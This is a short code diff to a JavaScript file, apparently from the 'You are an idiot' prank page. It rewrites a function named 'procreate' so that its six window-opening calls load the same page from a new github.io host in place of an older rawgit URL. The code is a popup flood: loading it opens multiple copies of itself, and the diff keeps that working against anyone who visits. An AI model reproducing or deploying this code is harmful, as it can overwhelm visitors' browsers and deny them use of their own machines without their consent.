@@ -9,12 +9,12 @@ function openWindow(url){
 }
 
 function procreate(){
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://thegamesss.github.io/youare/thing/thing.html');
+		openWindow('https://thegamesss.github.io/youare/thing/thing.html');
+		openWindow('https://thegamesss.github.io/youare/thing/thing.html');
+		openWindow('https://thegamesss.github.io/youare/thing/thing.html');
+		openWindow('https://thegamesss.github.io/youare/thing/thing.html');
+		openWindow('https://thegamesss.github.io/youare/thing/thing.html');
 		}
 
 function newXlt(){
